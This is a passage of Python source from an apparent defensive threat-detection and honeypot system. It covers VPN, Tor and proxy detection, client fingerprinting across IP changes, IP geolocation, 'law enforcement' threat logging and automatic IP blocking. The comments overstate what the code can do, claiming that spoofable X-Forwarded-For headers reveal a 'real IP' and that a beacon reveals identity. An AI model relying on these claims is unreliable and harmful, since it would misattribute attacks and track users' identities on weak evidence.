    if predicted_threat and actual_threat:
        _ml_performance_metrics['true_positives'] += 1
    elif predicted_threat and not actual_threat:
        _ml_performance_metrics['false_positives'] += 1
    elif not predicted_threat and actual_threat:
        _ml_performance_metrics['false_negatives'] += 1
    else:
        _ml_performance_metrics['true_negatives'] += 1
    
    # Calculate metrics
    tp = _ml_performance_metrics['true_positives']
    fp = _ml_performance_metrics['false_positives']
    fn = _ml_performance_metrics['false_negatives']
    tn = _ml_performance_metrics['true_negatives']
    
    total = tp + fp + tn + fn
    
    if total > 0:
        _ml_performance_metrics['accuracy'] = (tp + tn) / total
    
    if (tp + fp) > 0:
        _ml_performance_metrics['precision'] = tp / (tp + fp)
    
    if (tp + fn) > 0:
        _ml_performance_metrics['recall'] = tp / (tp + fn)
    
    precision = _ml_performance_metrics['precision']
    recall = _ml_performance_metrics['recall']
    
    if (precision + recall) > 0:
        _ml_performance_metrics['f1_score'] = 2 * (precision * recall) / (precision + recall)


def _adapt_thresholds() -> None:
    """Adaptive learning: Adjust thresholds based on performance metrics."""
    global _adaptive_thresholds
    
    # Only adapt if we have enough data
    if _ml_performance_metrics['predictions_made'] < 100:
        return
    
    precision = _ml_performance_metrics['precision']
    recall = _ml_performance_metrics['recall']
    
    # If too many false positives, increase threshold (be more conservative)
    if precision < 0.85 and precision > 0:
        _adaptive_thresholds['ensemble_threshold'] = min(0.85, _adaptive_thresholds['ensemble_threshold'] + 0.02)
        print(f"[AI ADAPTIVE] Increased ensemble threshold to {_adaptive_thresholds['ensemble_threshold']:.2f} (precision={precision:.2f})")
    
    # If too many false negatives, decrease threshold (be more aggressive)
    elif recall < 0.90 and recall > 0:
        _adaptive_thresholds['ensemble_threshold'] = max(0.50, _adaptive_thresholds['ensemble_threshold'] - 0.02)
        print(f"[AI ADAPTIVE] Decreased ensemble threshold to {_adaptive_thresholds['ensemble_threshold']:.2f} (recall={recall:.2f})")


def _detect_vpn_tor_proxy(ip_address: str, headers: dict) -> dict:
    """Advanced VPN/Tor/Proxy detection for revealing true attacker identity.
    
    Multi-layer detection:
    1. Known VPN/Tor exit node databases
    2. Proxy header analysis (X-Forwarded-For chains)
    3. ISP pattern matching (hosting providers = likely VPN)
    4. ASN analysis (datacenter ranges)
    5. Behavioral fingerprinting across IP changes
    
    Returns detection results with confidence level and real IP candidates.
    """
    detection_result = {
        "is_anonymized": False,
        "anonymization_type": "direct",
        "confidence": 0,
        "real_ip_candidates": [],
        "proxy_chain": [],
        "detection_methods": []
    }
    
    # Method 1: Analyze proxy headers to extract real IP from chain
    x_forwarded = headers.get('x-forwarded-for', headers.get('X-Forwarded-For', ''))
    x_real_ip = headers.get('x-real-ip', headers.get('X-Real-IP', ''))
    forwarded = headers.get('forwarded', headers.get('Forwarded', ''))
    via = headers.get('via', headers.get('Via', ''))
    
    if x_forwarded:
        # X-Forwarded-For contains proxy chain: client, proxy1, proxy2, ...
        proxy_chain = [ip.strip() for ip in x_forwarded.split(',')]
        if len(proxy_chain) > 1:
            detection_result["is_anonymized"] = True
            detection_result["anonymization_type"] = "proxy_chain"
            detection_result["proxy_chain"] = proxy_chain
            detection_result["real_ip_candidates"].append(proxy_chain[0])  # First IP is usually real client
            detection_result["confidence"] += 40
            detection_result["detection_methods"].append("X-Forwarded-For analysis")
            _proxy_chain_tracker[ip_address] = proxy_chain
    
    if x_real_ip and x_real_ip != ip_address:
        detection_result["is_anonymized"] = True
        detection_result["real_ip_candidates"].append(x_real_ip)
        detection_result["confidence"] += 30
        detection_result["detection_methods"].append("X-Real-IP header")
    
    if via:
        detection_result["is_anonymized"] = True
        detection_result["anonymization_type"] = "proxy"
        detection_result["confidence"] += 25
        detection_result["detection_methods"].append(f"Via proxy: {via}")
    
    # Method 2: Check for Tor exit nodes (known patterns)
    # Tor exit nodes often have reverse DNS with specific patterns
    tor_indicators = ['tor-exit', 'torexit', 'tor.exit', 'exitnode']
    isp_lower = ""  # Will be filled by geo lookup
    
    # Method 3: Detect VPN/hosting provider IPs (datacenter ranges)
    # Common VPN providers use hosting/datacenter IPs, not residential
    vpn_isp_keywords = [
        'vpn', 'proxy', 'hosting', 'datacenter', 'data center',
        'cloud', 'server', 'digital ocean', 'aws', 'azure', 'google cloud',
        'ovh', 'hetzner', 'linode', 'vultr', 'choopa',
        'vpngate', 'hidemyass', 'nordvpn', 'expressvpn', 'privateinternetaccess'
    ]
    
    # Get geolocation to check ISP
    geo_data = _get_geolocation(ip_address)
    isp_lower = geo_data.get('isp', '').lower()
    org_lower = geo_data.get('org', '').lower()
    
    # Check for VPN/hosting ISP
    for keyword in vpn_isp_keywords:
        if keyword in isp_lower or keyword in org_lower:
            detection_result["is_anonymized"] = True
            detection_result["anonymization_type"] = "vpn_or_hosting"
            detection_result["confidence"] += 35
            detection_result["detection_methods"].append(f"VPN/Hosting ISP detected: {keyword}")
            break
    
    # Check for Tor
    for indicator in tor_indicators:
        if indicator in isp_lower or indicator in org_lower:
            detection_result["is_anonymized"] = True
            detection_result["anonymization_type"] = "tor_exit_node"
            detection_result["confidence"] += 50
            detection_result["detection_methods"].append("Tor exit node detected")
            break
    
    # Method 4: Behavioral correlation - link this IP to previously seen real IPs
    # (This would be implemented with fingerprinting)
    
    # Cap confidence at 100
    detection_result["confidence"] = min(detection_result["confidence"], 100)
    
    return detection_result


def _load_dns_metrics() -> dict:
    """Load aggregated DNS metrics from dns_security.json with small TTL cache.

    Metrics are written by AI/dns_analyzer.py and exposed by the server for
    dashboards. Here we reuse them to strengthen the Layer 11 VPN/Tor signal
    without re-reading the file on every request.
    """
    global _dns_metrics_cache, _dns_metrics_last_load

    now = time.time()
    if _dns_metrics_cache is not None and _dns_metrics_last_load is not None:
        if now - _dns_metrics_last_load < _DNS_TLS_CACHE_TTL_SECONDS:
            return _dns_metrics_cache

    try:
        # Use the unified JSON directory helper so DNS metrics are
        # read from the same location used by AI.dns_analyzer.
        try:
            from AI.path_helper import get_json_file
            dns_metrics_file = get_json_file("dns_security.json")
        except Exception:
            # Fallback mirrors legacy server/server.py behavior.
            if os.path.exists("/app"):
                dns_metrics_file = "/app/json/dns_security.json"
            else:
                dns_metrics_file = os.path.join(os.path.dirname(__file__), "..", "server", "json", "dns_security.json")

        if os.path.exists(dns_metrics_file):
            with open(dns_metrics_file, "r") as f:
                data = json.load(f)
            if isinstance(data, dict):
                _dns_metrics_cache = data.get("sources", {}) or {}
            else:
                _dns_metrics_cache = {}
        else:
            _dns_metrics_cache = {}
    except Exception:
        # Never break detection if metrics are missing or invalid
        _dns_metrics_cache = {}

    _dns_metrics_last_load = now
    return _dns_metrics_cache


def _load_tls_metrics() -> dict:
    """Load aggregated TLS metrics from tls_fingerprints.json with TTL cache."""
    global _tls_metrics_cache, _tls_metrics_last_load

    now = time.time()
    if _tls_metrics_cache is not None and _tls_metrics_last_load is not None:
        if now - _tls_metrics_last_load < _DNS_TLS_CACHE_TTL_SECONDS:
            return _tls_metrics_cache

    try:
        # Align with AI.tls_fingerprint persistence via the unified
        # JSON directory helper where available.
        try:
            from AI.path_helper import get_json_file
            tls_metrics_file = get_json_file("tls_fingerprints.json")
        except Exception:
            if os.path.exists("/app"):
                tls_metrics_file = "/app/json/tls_fingerprints.json"
            else:
                tls_metrics_file = os.path.join(os.path.dirname(__file__), "..", "server", "json", "tls_fingerprints.json")

        if os.path.exists(tls_metrics_file):
            with open(tls_metrics_file, "r") as f:
                data = json.load(f)
            if isinstance(data, dict):
                _tls_metrics_cache = data.get("sources", {}) or {}
            else:
                _tls_metrics_cache = {}
        else:
            _tls_metrics_cache = {}
    except Exception:
        _tls_metrics_cache = {}

    _tls_metrics_last_load = now
    return _tls_metrics_cache


def _create_tracking_beacon(ip_address: str, session_id: str) -> str:
    """Create a unique tracking beacon to identify attacker across IP changes.
    
    Generates a cryptographic token that:
    1. Embeds encrypted geolocation data
    2. Contains session fingerprint
    3. Has maximum TTL to trace back to source
    4. Can be used to correlate attacks from different IPs
    
    For law enforcement: This beacon can reveal real identity even if IP changes.
    """
    import hashlib
    import base64
    
    # Create unique beacon ID
    beacon_data = f"{ip_address}:{session_id}:{datetime.now(timezone.utc).isoformat()}"
    beacon_hash = hashlib.sha256(beacon_data.encode()).hexdigest()[:16]
    
    # Store beacon for tracking
    _honeypot_beacons[beacon_hash] = {
        "original_ip": ip_address,
        "session_id": session_id,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "accessed_from_ips": [ip_address],
        "geolocation_trail": [_get_geolocation(ip_address)]
    }
    
    # Encode beacon with base64 for safe transmission
    beacon_token = base64.b64encode(beacon_hash.encode()).decode()
    
    return beacon_token


def _fingerprint_client(ip_address: str, user_agent: str, headers: dict, behavioral_data: dict = None) -> str:
    """Create unique client fingerprint to track attackers across IP changes.
    
    Combines multiple signals:
    1. User-Agent normalization
    2. Accept headers (language, encoding, types)
    3. Header order and casing
    4. TCP/IP characteristics
    5. Behavioral patterns (timing, endpoints accessed)
    
    Returns fingerprint hash that persists even if attacker changes IP/VPN.
    """
    import hashlib
    
    # Collect fingerprinting signals
    signals = []
    
    # User-Agent
    signals.append(f"ua:{user_agent}")
    
    # Accept headers (browsers send these in specific order)
    accept = headers.get('accept', headers.get('Accept', ''))
    accept_lang = headers.get('accept-language', headers.get('Accept-Language', ''))
    accept_encoding = headers.get('accept-encoding', headers.get('Accept-Encoding', ''))
    signals.extend([f"accept:{accept}", f"lang:{accept_lang}", f"enc:{accept_encoding}"])
    
    # Connection preferences
    connection = headers.get('connection', headers.get('Connection', ''))
    signals.append(f"conn:{connection}")
    
    # DNT and other tracking headers
    dnt = headers.get('dnt', headers.get('DNT', ''))
    if dnt:
        signals.append(f"dnt:{dnt}")
    
    # Behavioral patterns if provided
    if behavioral_data:
        timing_pattern = behavioral_data.get('timing_pattern', '')
        endpoint_pattern = behavioral_data.get('endpoint_pattern', '')
        signals.extend([f"timing:{timing_pattern}", f"endpoints:{endpoint_pattern}"])
    
    # Create fingerprint hash
    fingerprint_string = "|".join(signals)
    fingerprint = hashlib.sha256(fingerprint_string.encode()).hexdigest()
    
    # Store fingerprint with IP mapping
    if fingerprint not in _fingerprint_tracker:
        _fingerprint_tracker[fingerprint] = {
            "first_seen": datetime.now(timezone.utc).isoformat(),
            "ips_used": set(),
            "user_agents": set(),
            "total_requests": 0
        }
    
    _fingerprint_tracker[fingerprint]["ips_used"].add(ip_address)
    _fingerprint_tracker[fingerprint]["user_agents"].add(user_agent)
    _fingerprint_tracker[fingerprint]["total_requests"] += 1
    
    # Correlate IPs - if same fingerprint from multiple IPs, track them
    if len(_fingerprint_tracker[fingerprint]["ips_used"]) > 1:
        # Same attacker using multiple IPs (VPN hopping)
        all_ips = _fingerprint_tracker[fingerprint]["ips_used"]
        for tracked_ip in all_ips:
            _real_ip_correlation[ip_address].update(all_ips - {ip_address})
    
    return fingerprint


def _build_vpn_tor_signal(
    ip_address: str,
    headers: dict,
    actor_key: ActorKey,
    endpoint: str,
    method: str,
) -> tuple[Optional[DetectionSignal], Optional[EvidenceEvent]]:
    """Compose Layer 11 VPN/Tor signal from multiple anonymization evidences.

    This uses existing building blocks (header/ISP VPN detection, DNS/tunneling
    metrics, TLS fan-out, timing analysis, and fingerprint/IP correlation) to
    create a single MetaDecisionEngine signal. It is conservative by design:
    evidence must accumulate before we treat anonymization as a high-confidence
    threat indicator.
    """
    if not META_ENGINE_AVAILABLE:
        return None, None

    # 1) Base VPN/Tor detection from headers + ISP/ASN patterns
    vpn_data = _detect_vpn_tor_proxy(ip_address, headers or {})
    is_anonymized = bool(vpn_data.get("is_anonymized"))
    anon_conf = float(vpn_data.get("confidence", 0) or 0) / 100.0
    anon_type = str(vpn_data.get("anonymization_type", "")).lower() or "direct"

    # 2) DNS tunneling / exfil suspicion for this IP
    dns_sources = _load_dns_metrics()
    dns_stats = dns_sources.get(ip_address) if isinstance(dns_sources, dict) else None
    dns_suspicious = 0
    dns_total = 0
    if isinstance(dns_stats, dict):
        dns_suspicious = int(dns_stats.get("suspicious_queries", 0) or 0)
        dns_total = int(dns_stats.get("total_queries", 0) or 0)

    dns_ratio = (dns_suspicious / dns_total) if dns_total > 0 else 0.0

    # 3) TLS encrypted C2 heuristics for this IP
    tls_sources = _load_tls_metrics()
    tls_stats = tls_sources.get(ip_address) if isinstance(tls_sources, dict) else None
    tls_nonstandard_ports = []
    tls_unique_dests = 0
    tls_total_flows = 0
    if isinstance(tls_stats, dict):
        tls_nonstandard_ports = tls_stats.get("nonstandard_tls_ports", []) or []
        tls_unique_dests = int(tls_stats.get("unique_dests", 0) or 0)
        tls_total_flows = int(tls_stats.get("total_flows", 0) or 0)

    has_nonstandard_tls = isinstance(tls_nonstandard_ports, list) and len(tls_nonstandard_ports) > 0
    high_tls_fanout = tls_unique_dests > 50 and tls_total_flows > 200

    # 4) Timing anomalies (uniform timing often indicates bots / scripted use)
    timing_info = analyze_request_timing(ip_address)
    timing_suspicious = timing_info.get("status") == "suspicious"

    # 5) VPN hopping: same fingerprint used across multiple IPs (already tracked)
    correlated_ips = list(_real_ip_correlation.get(ip_address, set()))
    vpn_hopping = len(correlated_ips) >= 2

    # Combine evidences into a conservative confidence score
    confidence = 0.0
    reasons: list[str] = []

    if is_anonymized:
        confidence += min(0.4, anon_conf * 0.6)
        reasons.append(f"Anonymization detected via {anon_type} (base={anon_conf:.2f})")

    if dns_ratio >= 0.2 and dns_suspicious >= 10:
        confidence += 0.2
        reasons.append(f"DNS tunneling/exfil suspected ({dns_suspicious}/{dns_total} suspicious queries)")

    if has_nonstandard_tls:
        confidence += 0.15
        reasons.append("Encrypted traffic on non-standard TLS ports")

    if high_tls_fanout:
        confidence += 0.15
        reasons.append(f"High TLS fan-out: {tls_unique_dests} destinations / {tls_total_flows} flows")

    if timing_suspicious:
        confidence += 0.1
        reasons.append("Uniform request timing pattern (likely scripted)")

    if vpn_hopping:
        confidence += 0.1
        reasons.append(f"Same actor correlated across {len(correlated_ips) + 1} IPs (VPN hopping)")

    # Cap to [0, 0.98] and be conservative
    confidence = max(0.0, min(confidence, 0.98))

    # If we have very low combined evidence, do not emit a dedicated signal
    if confidence < 0.35:
        return None, None

    # Treat anonymization as a threat signal only when combined evidence is strong
    is_threat = confidence >= 0.6

    details_parts = reasons[:] if reasons else ["Anonymization evidence present"]
    details = "; ".join(details_parts)

    sig = DetectionSignal(
        signal_type=getattr(MetaSignalType, "VPN_TOR", MetaSignalType.ML_REPUTATION),
        is_threat=is_threat,
        confidence=confidence,
        threat_level=MetaThreatLevel.DANGEROUS if is_threat else MetaThreatLevel.SUSPICIOUS,
        details=details,
        timestamp=datetime.now(timezone.utc).isoformat(),
        metadata={
            "anonymization_type": anon_type,
            "anonymization_confidence": anon_conf,
            "dns_suspicious": dns_suspicious,
            "dns_total": dns_total,
            "tls_nonstandard_ports": tls_nonstandard_ports,
            "tls_unique_dests": tls_unique_dests,
            "tls_total_flows": tls_total_flows,
            "timing_suspicious": timing_suspicious,
            "vpn_hopping_ips": correlated_ips,
        },
    )

    evidence = EvidenceEvent(
        actor_id=actor_key.id,
        source_ip=ip_address,
        behavior_type="vpn_tor_fingerprinting",
        signal_type=getattr(MetaSignalType, "VPN_TOR", MetaSignalType.ML_REPUTATION).name,
        is_threat=is_threat,
        confidence=confidence,
        severity=(MetaThreatLevel.DANGEROUS.value if is_threat else MetaThreatLevel.SUSPICIOUS.value),
        endpoint=endpoint,
        method=method,
        mitre_techniques=[],
        timestamp=sig.timestamp,
        raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
    )

    # Track detection statistics if dedicated VPN_TOR signal type exists
    if hasattr(MetaSignalType, "VPN_TOR") and is_threat:
        _record_signal_detection(getattr(MetaSignalType, "VPN_TOR"))

    return sig, evidence


def _get_geolocation(ip_address: str) -> dict:
    """Get geolocation data for an IP address for law enforcement tracking.
    
    Uses ip-api.com free API with maximum detail for attacker identification.
    Returns location data including: country, region, city, lat/lon, ISP, org.
    """
    # Skip for localhost/private IPs (no external lookup needed)
    if ip_address in ['127.0.0.1', 'localhost'] or ip_address.startswith('192.168.') or ip_address.startswith('10.'):
        return {
            "country": "Local",
            "regionName": "localhost",
            "city": "localhost",
            "isp": "Local Network",
            "org": "Private Network",
            "lat": 0.0,
            "lon": 0.0,
            "timezone": "UTC",
            "as": "Private",
            "query": ip_address
        }
    
    # Optional privacy/safety control: disable external geolocation
    if not _GEOLOCATION_ENABLED:
        return {
            "country": "Disabled",
            "city": "Disabled",
            "isp": "Disabled",
            "org": "Disabled",
            "lat": 0.0,
            "lon": 0.0,
            "timezone": "UTC",
            "as": "Disabled",
            "query": ip_address
        }
    
    try:
        # Use ip-api.com with fields for maximum tracking detail (HTTPS)
        url = f"https://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
        
        with urllib.request.urlopen(url, timeout=3) as response:
            data = json.loads(response.read().decode())
            
            if data.get('status') == 'success':
                return {
                    "country": data.get('country', 'Unknown'),
                    "countryCode": data.get('countryCode', 'XX'),
                    "region": data.get('region', 'Unknown'),
                    "regionName": data.get('regionName', 'Unknown'),
                    "city": data.get('city', 'Unknown'),
                    "zip": data.get('zip', 'Unknown'),
                    "lat": data.get('lat', 0.0),
                    "lon": data.get('lon', 0.0),
                    "timezone": data.get('timezone', 'Unknown'),
                    "isp": data.get('isp', 'Unknown'),
                    "org": data.get('org', 'Unknown'),
                    "as": data.get('as', 'Unknown'),
                    "query": data.get('query', ip_address)
                }
    except Exception as e:
        print(f"[GEO] Failed to get location for {ip_address}: {e}")
    
    # Fallback if geolocation fails
    return {
        "country": "Unknown",
        "city": "Unknown",
        "isp": "Unknown",
        "query": ip_address
    }


def _log_threat(ip_address: str, threat_type: str, details: str, level: ThreatLevel, action: str = "monitored", headers: dict = None, is_local: bool = True) -> None:
    """Log a security threat event with geolocation and VPN/proxy detection for law enforcement.

    Internal helper used by all detectors. For external modules (like the
    Flask server honeypot route), use the public log_threat() wrapper below
    so imports like ``from AI.pcs_ai import log_threat`` succeed cleanly.
    """
    # Get geolocation BEFORE blocking for tracking
    geo_data = _get_geolocation(ip_address)
    
    # Detect VPN/Tor/Proxy usage and attempt to reveal real IP
    anonymization_data = {}
    real_ip_revealed = None
    if headers:
        vpn_detection = _detect_vpn_tor_proxy(ip_address, headers)
        anonymization_data = vpn_detection
        if vpn_detection["real_ip_candidates"]:
            real_ip_revealed = vpn_detection["real_ip_candidates"][0]
    
    # Check if we've correlated this IP to other IPs (VPN hopping detection)
    correlated_ips = list(_real_ip_correlation.get(ip_address, set()))
    
    # PHASE 1A: Get behavioral metrics for this entity
    behavioral_data = {}
    if ADVANCED_AI_AVAILABLE:
        try:
            behavioral_heuristics = get_behavioral_heuristics()
            if behavioral_heuristics:
                metrics = behavioral_heuristics.get_entity_metrics(ip_address)
                if metrics:
                    behavioral_data = {
                        "risk_score": metrics.risk_score,
                        "connection_count_1min": metrics.connection_count_1min,
                        "connection_count_5min": metrics.connection_count_5min,
                        "port_entropy": metrics.port_entropy,
                        "auth_failure_ratio": metrics.auth_failure_ratio,
                        "fan_out": metrics.fan_out,
                        "fan_in": metrics.fan_in,
                        "retry_frequency": metrics.retry_frequency,
                        "timing_variance": metrics.timing_variance
                    }
        except Exception as e:
            logger.warning(f"[BEHAVIORAL] Failed to get metrics for {ip_address}: {e}")
    
    # PHASE 1B: Get attack state sequence prediction
    sequence_data = {}
    if ADVANCED_AI_AVAILABLE:
        try:
            sequence_analyzer = get_sequence_analyzer()
            if sequence_analyzer:
                # Calculate signature confidence from threat level
                signature_confidence = {
                    ThreatLevel.CRITICAL: 0.95,
                    ThreatLevel.DANGEROUS: 0.85,
                    ThreatLevel.SUSPICIOUS: 0.6,
                    ThreatLevel.WARNING: 0.4,
                    ThreatLevel.INFO: 0.2,
                    ThreatLevel.SAFE: 0.0
                }.get(level, 0.5)
                
                heuristic_score = behavioral_data.get('risk_score', 0.0)
                
                # Observe this event in sequence
                state_event = observe_event(
                    ip_address,
                    signature_score=signature_confidence,
                    heuristic_score=heuristic_score,
                    behavioral_features=behavioral_data
                )
                
                if state_event:
                    sequence_data = {
                        "current_state": state_event.state.value,
                        "state_confidence": state_event.confidence,
                        "attack_stage": state_event.attack_stage
                    }
                    
                    # Get prediction if enough history
                    prediction = sequence_analyzer.predict_sequence(ip_address)
                    if prediction:
                        sequence_data.update({
                            "predicted_next_state": prediction.predicted_next_state.value,
                            "next_state_probability": prediction.next_state_probability,
                            "sequence_risk_score": prediction.sequence_risk_score
                        })
        except Exception as e:
            logger.warning(f"[SEQUENCE] Failed to analyze sequence for {ip_address}: {e}")
    
    event = {
        "timestamp": _get_current_time().isoformat(),
        "ip_address": ip_address,
        "threat_type": threat_type,
        "details": details,
        "level": level.value,
        "action": action,  # monitored, blocked, dropped
        # Deployment-level security domain label (metadata only, used by
        # external MLS/label-aware systems; does not influence detection
        # or Step 21 semantics).
        "security_domain_label": get_security_domain_label() if SECURE_DEPLOYMENT_AVAILABLE else "UNCLASSIFIED",
        # Law enforcement geolocation tracking
        "geolocation": {
            "country": geo_data.get('country', 'Unknown'),
            "region": geo_data.get('regionName', 'Unknown'),
            "city": geo_data.get('city', 'Unknown'),
            "coordinates": f"{geo_data.get('lat', 0.0)}, {geo_data.get('lon', 0.0)}",
            "isp": geo_data.get('isp', 'Unknown'),
            "organization": geo_data.get('org', 'Unknown'),
            "asn": geo_data.get('as', 'Unknown'),
            "timezone": geo_data.get('timezone', 'Unknown'),
        },
        # CRITICAL: VPN/Proxy/Tor detection for revealing true identity
        "anonymization_detection": {
            "is_anonymized": anonymization_data.get('is_anonymized', False),
            "anonymization_type": anonymization_data.get('anonymization_type', 'direct'),
            "confidence": anonymization_data.get('confidence', 0),
            "detection_methods": anonymization_data.get('detection_methods', []),
            "proxy_chain": anonymization_data.get('proxy_chain', []),
            "real_ip_revealed": real_ip_revealed,
            "correlated_ips": correlated_ips,  # Other IPs same attacker used
        },
        # PHASE 1A: Behavioral Heuristics (for AI learning)
        "behavioral_metrics": behavioral_data if behavioral_data else None,
        # PHASE 1B: Attack State Sequence (for AI learning)
        "attack_sequence": sequence_data if sequence_data else None
    }
    
    # Log for law enforcement with full tracking data + VPN/proxy detection
    anonymization_info = ""
    if anonymization_data.get('is_anonymized'):
        anonymization_info = f" | 🚨 ANONYMIZED via {anonymization_data.get('anonymization_type', 'unknown').upper()} (Confidence: {anonymization_data.get('confidence', 0)}%)"
        if real_ip_revealed:
            anonymization_info += f" | 🎯 REAL IP REVEALED: {real_ip_revealed}"
        if correlated_ips:
            anonymization_info += f" | 🔗 LINKED IPs: {', '.join(correlated_ips[:3])}"
    
    print(f"[LAW ENFORCEMENT TRACKING] {threat_type} from {ip_address} | Location: {geo_data.get('city')}, {geo_data.get('regionName')}, {geo_data.get('country')} | ISP: {geo_data.get('isp')} | Coordinates: {geo_data.get('lat')}, {geo_data.get('lon')}{anonymization_info}")

    # Mark event source (local or peer)
    event['source'] = 'local' if is_local else 'peer'

    # Store in appropriate log
    if is_local:
        _threat_log.append(event)  # Local threats (shown on dashboard)
        # Keep only last 1000 events to prevent memory overflow
        if len(_threat_log) > 1000:
            _threat_log.pop(0)
        # Save to disk for persistence
        _save_threat_log()

        # IP BLOCKING: Block attacker IP immediately (critical security fix)
        # All local threats trigger IP blocking - this is the TRUE ARCHITECTURE
        _block_ip(ip_address)
        print(f"[IP BLOCKING] 🚫 Blocked {ip_address} for {threat_type}")

        # SIGNATURE EXTRACTION: Extract attack patterns (NOT exploit code)
        try:
            from signature_extractor import extract_from_threat
            signatures = extract_from_threat({
                'payload': details,  # Attack string
                'ip': ip_address,
                'type': threat_type,
                'timestamp': event['timestamp']
            })
            event['extracted_signatures'] = signatures  # Add to event (patterns only)
            print(
                f"[SIGNATURE EXTRACTOR] Extracted {len(signatures.get('keywords_found', []))} keywords, "
                f"{len(signatures.get('encodings_detected', []))} encodings from attack"
            )
        except Exception as e:
            print(f"[SIGNATURE EXTRACTOR] Warning: {e}")

        # RELAY: Send threat to global relay server for P2P mesh sharing
        if RELAY_AVAILABLE and os.getenv('RELAY_ENABLED', 'false').lower() == 'true':
            logger.debug(
                f"[RELAY-DEBUG] Attempting to send threat to relay: "
                f"RELAY_AVAILABLE={RELAY_AVAILABLE}, RELAY_ENABLED={os.getenv('RELAY_ENABLED')}"
            )
            try:
                # Multi-sensor deployments: tag each event with a stable sensor identifier
                sensor_id = None
                try:
                    if NODE_FP_AVAILABLE:
                        # Use node fingerprint hash as sensor ID when available
                        sensor_id = node_fp.fingerprint.get('fingerprint_hash')
                except Exception:
                    sensor_id = None

                if not sensor_id:
                    # Fallback to hostname when node fingerprint is unavailable
                    try:
                        import platform
                        sensor_id = platform.node()
                    except Exception:
                        sensor_id = 'unknown-sensor'

                relay_threat({
                    'ip_address': ip_address,
                    'threat_type': threat_type,
                    # Also expose a canonical attack_type field for relay analytics
                    'attack_type': threat_type,
                    'sensor_id': sensor_id,
                    'details': details,
                    'level': level.name if hasattr(level, 'name') else str(level),
                    'timestamp': event['timestamp'],
                    'action': action,
                    'geolocation': geo_data,
                    'anonymization': anonymization_data,
                    'behavioral_metrics': behavioral_data,
                    'attack_sequence': sequence_data,
                    'extracted_signatures': event.get('extracted_signatures', {})
                })
                logger.info(f"[RELAY] ✅ Sent threat to relay: {threat_type} from {ip_address}")
            except Exception as e:
                logger.warning(f"[RELAY] Failed to send threat to relay: {e}")

        # ALERTING: Trigger email/SMS alerts for high-severity threats
        try:
            from AI.alert_system import alert_system
            alert_system.send_alert_for_threat(
                event,
                min_severity=os.getenv('ALERT_MIN_SEVERITY', 'CRITICAL')
            )
        except Exception as e:
            logger.warning(f"[ALERT] Failed to send alert for threat: {e}")
    else:
        _peer_threats.append(event)  # Peer threats (AI training only)
        # Keep only last 500 peer events in memory
        if len(_peer_threats) > 500:
            _peer_threats.pop(0)
        # Save peer threats for ML training persistence
        if len(_peer_threats) % 10 == 0:  # Save every 10 events
            _save_peer_threats()

    # THREAT INTELLIGENCE: Check IP reputation with VirusTotal & AbuseIPDB
    if ENTERPRISE_FEATURES_AVAILABLE:
        try:
            # Query external threat intelligence (async in background)
            threat_score_data = threat_intel.check_ip_reputation(ip_address)
            if threat_score_data.get("threat_score", 0) >= 80:
                print(
                    f"[ThreatIntel] 🚨 HIGH THREAT IP: {ip_address} "
                    f"(Score: {threat_score_data['threat_score']}/100)"
                )
                # Auto-block IPs with very high threat scores
                if (
                    threat_score_data["threat_score"] >= 90
                    and ip_address not in _WHITELISTED_IPS
                ):
                    _block_ip(ip_address)
                    print(
                        f"[ThreatIntel] 🛡️ AUTO-BLOCKED {ip_address} based on threat intelligence"
                    )

            # Send to SIEM systems (Splunk, QRadar, etc.)
            siem_integration.send_event(event, format_type="CEF")

        except Exception as e:
            print(f"[ThreatIntel] Warning: {e}")

    # AUTO-TRAINING: Train models automatically when criteria met (SELF-LEARNING)
    if ML_AVAILABLE and _should_retrain_ml_models():
        print(
            f"[AI] 🎓 AUTO-TRAINING triggered after logging threat (total: {len(_threat_log)} events)..."
        )
        _train_ml_models_from_history()


def log_threat(ip_address: str, threat_type: str, details: str, level: ThreatLevel,
               action: str = "monitored", headers: dict | None = None,
               is_local: bool = True) -> None:
    """Public wrapper for logging a threat event.

    This is the function used by the Flask /api/* honeypot route and any
    external integrations. It simply delegates to _log_threat so that IP
    blocking, persistence, relay export, and alerting all behave exactly
    the same as for core detectors.
    """
    return _log_threat(
        ip_address=ip_address,
        threat_type=threat_type,
        details=details,
        level=level,
        action=action,
        headers=headers,
        is_local=is_local,
    )


def log_honeypot_attack(threat_data: dict) -> None:
    """
    Log honeypot attack to AI training system (sandbox)
    All honeypot attacks are fed into ML training to learn threat patterns
    
    Args:
        threat_data: Dictionary containing:
            - ip_address: Attacker IP
            - threat_type: Type of honeypot attack (e.g., 'honeypot_ssh')
            - level: Threat level (usually 'DANGEROUS')
            - details: Attack details
            - timestamp: When attack occurred
            - honeypot_persona: Which honeypot was attacked
            - honeypot_port: Port that was attacked
    """
    ip_address = threat_data.get('ip_address', '0.0.0.0')
    threat_type = threat_data.get('threat_type', 'honeypot_unknown')
    level_str = threat_data.get('level', 'DANGEROUS')
    details = threat_data.get('details', 'Honeypot interaction')
    persona = threat_data.get('honeypot_persona')
    analysis = threat_data.get('analysis') or {}
    attack_category = analysis.get('attack_category', 'honeypot_probe')
    suspicion_score = analysis.get('suspicion_score', 0.85)
    
    # Convert string level to ThreatLevel enum
    level = ThreatLevel[level_str] if level_str in ThreatLevel.__members__ else ThreatLevel.DANGEROUS
    
    # Log the threat (this feeds into AI training)
    _log_threat(
        ip_address=ip_address,
        threat_type=threat_type,
        details=f"🍯 HONEYPOT: {details}",
        level=level,
        action="sandboxed",  # Sandboxed = isolated, no real system access
        headers=None,
        is_local=True
    )
    
    # Attach honeypot-specific metadata to last local event (for explainability/forensics)
    try:
        if _threat_log:
            last_event = _threat_log[-1]
            if last_event.get("ip_address") == ip_address and last_event.get("threat_type") == threat_type:
                last_event.setdefault("honeypot", {})
                last_event["honeypot"].update({
                    "persona": persona,
                    "analysis": analysis
                })
                _save_threat_log()
    except Exception as e:
        logger.debug(f"[HONEYPOT→AI] Failed to attach honeypot metadata: {e}")

    print(f"[HONEYPOT→AI] 🍯 Attack from {ip_address} added to AI training sandbox")
    
    # Auto-block IPs that hit honeypots (they're obviously attackers)
    if ip_address not in _WHITELISTED_IPS and ip_address != '127.0.0.1':
        _block_ip(ip_address)
        print(f"[HONEYPOT→AI] 🛡️ AUTO-BLOCKED {ip_address} for honeypot interaction")

    # Feed honeypot interactions into persistent reputation tracker
    if REPUTATION_TRACKER_AVAILABLE:
        try:
            tracker = get_reputation_tracker()
            if tracker:
